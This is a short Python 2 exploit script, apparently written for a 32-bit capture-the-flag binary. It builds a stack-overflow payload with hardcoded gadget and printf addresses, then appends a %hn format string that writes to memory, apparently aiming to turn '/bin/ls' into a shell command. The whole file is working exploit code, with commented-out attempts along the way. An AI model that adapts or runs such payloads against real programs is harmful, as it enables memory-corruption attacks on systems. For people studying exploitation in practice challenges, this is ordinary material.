import struct

x = lambda a: struct.pack('<I', a)

def batch(it, n): 
    l = len(it) 
    for i in range(0, l, n): 
        yield it[i:min(i + n, l)] 

popx1ret = 0x080486db
popx2ret = 0x080486da
popx3ret = 0x080486d9

payload = 'D'*40
payload += 'BBBB'
payload += x(0x08048400) # Address of printf
payload += x(popx1ret) # ret addr
#payload += x(0xffffd02c) # address of format string
payload += x(0xffffd028)
#payload += x(0x804864c) # address of usefulFunction
payload += 'DDDD'

# unable to pass format string inline because it is longer than a word,
# making a fake data section on the stack
# address to write 0x0068732f
# Add the string (with addresses) to the stack
#payload += x(0x0804875a) # Address of "/ls" in "/bin/ls" 
#payload += x(0x08048758) 
#format_string = r"%.96x%2\$hn%.29383x%3\$hn"
payload += x(0x08048758)
format_string = r"%.96x%3\$hn"
#format_string = "DDDD" + "%08x."*4
for i in batch(format_string, 4):
    payload += x(int("0x" + "".join([hex(ord(l))[2:] for l in i[::-1]]), 0))

print payload
